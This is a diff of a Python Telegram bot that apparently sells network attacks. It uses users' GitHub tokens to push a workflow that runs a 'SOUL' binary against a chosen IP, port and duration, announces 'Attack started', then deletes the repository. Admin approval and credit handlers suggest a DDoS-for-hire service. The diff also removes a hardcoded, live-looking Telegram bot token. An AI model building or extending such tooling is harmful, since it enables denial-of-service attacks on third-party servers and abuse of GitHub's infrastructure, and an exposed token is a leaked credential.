@@ -2,22 +2,19 @@ import os
 import asyncio
 import base64
 import json
+import threading
 from datetime import datetime
+
+from flask import Flask
 from telegram import Update
 from telegram.constants import ChatAction
 from telegram.ext import Application, CommandHandler, ContextTypes
 from github import Github, InputGitTreeElement, Auth
-from flask import Flask
-import threading
 
-
-app_flask = Flask(__name__)
-
-@app_flask.route('/')
-def index():
-    return "Bot is running!"
-
-TELEGRAM_TOKEN = '7828525928:AAGyxRd-HIfgqSgBwtzM2fYRK9EIR3QImS0'
+# Load your Telegram token from environment variable (more secure!)
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
+if not TELEGRAM_TOKEN:
+    raise RuntimeError("Please set the TELEGRAM_TOKEN environment variable!")
 
 ADMIN_IDS = {7163028849}
 DATA_FILE = 'soul.json'
@@ -201,7 +198,7 @@ async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Time must be a positive integer")
         return
     if not os.path.isfile("SOUL"):
-        await update.message.reply_text("Local binary 'soul' not found!")
+        await update.message.reply_text("Local binary 'SOUL' not found!")
         return
     await context.bot.send_chat_action(chat_id=int(chat_id), action=ChatAction.TYPING)
     msg = await update.message.reply_text(f"{VBV_LOADING_FRAMES[0]}  0% completed")
@@ -278,38 +275,40 @@ async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, 
             type='blob',
             content=yml_content,
         )
-        workflow_tree = repo.create_git_tree([yml_element], base_tree)
-        workflow_commit = repo.create_git_commit("Add workflow", workflow_tree, [base_commit])
-        base_ref.edit(workflow_commit.sha)
-    except Exception:
-        pass
+        new_tree = repo.create_git_tree([yml_element], base_tree)
+        new_commit = repo.create_git_commit("Add soul.yml workflow", new_tree, [base_commit])
+        base_ref.edit(new_commit.sha)
+        await asyncio.sleep(10)
+        await context.bot.send_message(
+            chat_id=int(chat_id),
+            text=f"ID: {id_}\nAttack started on {ip}:{port} for {time} seconds."
+        )
+        await asyncio.sleep(30)
+        await repo.delete()
+    except Exception as e:
+        await context.bot.send_message(chat_id=int(chat_id), text=f"Error with ID {id_}: {e}")
 
-async def schedule_delete_and_notify(chat_id, github_token, repo_name, sec, ip, port, time, update):
-    await asyncio.sleep(sec)
-    try:
-        g = Github(auth=Auth.Token(github_token))
-        repo = g.get_user().get_repo(repo_name)
-        repo.delete()
-        await update.message.reply_text(f"🛑 Attack over on {ip}:{port} after {time} seconds.")
-    except Exception:
-        pass
+# Flask app to keep port alive on Render.com
+app_flask = Flask(__name__)
+
+@app_flask.route('/')
+def index():
+    return "✅ Bot is running on Render!"
 
 def run_telegram_bot():
-    app = Application.builder().token(TELEGRAM_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("approve", approve))
-    app.add_handler(CommandHandler("credit", add_credit))
-    app.add_handler(CommandHandler("remove", remove))
-    app.add_handler(CommandHandler("token", token))
-    app.add_handler(CommandHandler("server", server))
-    app.add_handler(CommandHandler("status", status))
-    app.run_polling()
+    application = Application.builder().token(TELEGRAM_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("approve", approve))
+    application.add_handler(CommandHandler("credit", add_credit))
+    application.add_handler(CommandHandler("remove", remove))
+    application.add_handler(CommandHandler("token", token))
+    application.add_handler(CommandHandler("server", server))
+    application.add_handler(CommandHandler("status", status))
+    application.run_polling()
 
 def main():
-    # Start the Telegram bot in a new thread
+    # Run telegram bot in a thread so flask server can run simultaneously
     threading.Thread(target=run_telegram_bot).start()
-
-    # Start the Flask app to keep the port open on Render
     port = int(os.environ.get('PORT', 5000))
     app_flask.run(host='0.0.0.0', port=port)
 
